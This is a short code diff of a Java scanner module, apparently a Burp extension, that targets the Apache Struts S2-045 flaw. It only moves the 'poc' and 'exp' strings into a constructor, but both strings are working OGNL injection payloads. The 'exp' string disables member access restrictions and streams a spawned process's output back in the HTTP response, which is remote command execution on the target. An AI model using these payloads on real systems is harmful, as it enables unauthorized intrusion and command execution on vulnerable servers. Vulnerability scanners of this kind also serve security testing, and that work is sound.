@@ -6,11 +6,13 @@ import java.util.Arrays;
 import java.util.List;
 
 public class S2_045 extends IModule {
-    public String poc =
+    public S2_045() {
+        poc =
             "%{" +
             "#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xxx','"+injectMark[0]+"'+'"+injectMark[1]+"')" +
             "}.multipart/form-data";
-    public String exp =
+
+        exp =
             "%{" +
             "(#nike='multipart/form-data')" +
             ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
@@ -34,6 +36,7 @@ public class S2_045 extends IModule {
             ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))" +
             ".(#ros.flush())" +
             "}";
+    }
 
     @Override
     public IScanIssue start() {
